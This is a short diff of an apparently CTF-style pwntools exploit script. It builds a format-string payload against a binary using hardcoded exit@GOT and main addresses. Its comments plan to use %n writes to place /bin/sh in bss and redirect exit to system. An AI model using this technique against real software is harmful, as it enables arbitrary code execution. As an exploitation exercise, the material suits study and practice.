@@ -17,13 +17,17 @@ deadcode = p64(0xdeadc0dedeadc0de)
 
 # Using %s will cause it to go to a memory address,
 # grab the contents, and print them out
-
 main_func = p64(0x401328)
 exit_got  = p64(0x404058)
 
-payload = exit_got
-#payload = b"AAAA "
-payload += b"%x %x %x %x %x %n"
+# Need to use %n to write /bin/sh to bss
+# Need to use %n to overwrite exit@got with system@got
+# Need to locate first argument to exit@got in memory,
+# and overwrite it with the address of the bss segment
+
+#payload = exit_got
+payload = b"AAAA "
+payload += b"%x %x %x %x %x %i"
 
 #print(hexdump(payload))
 
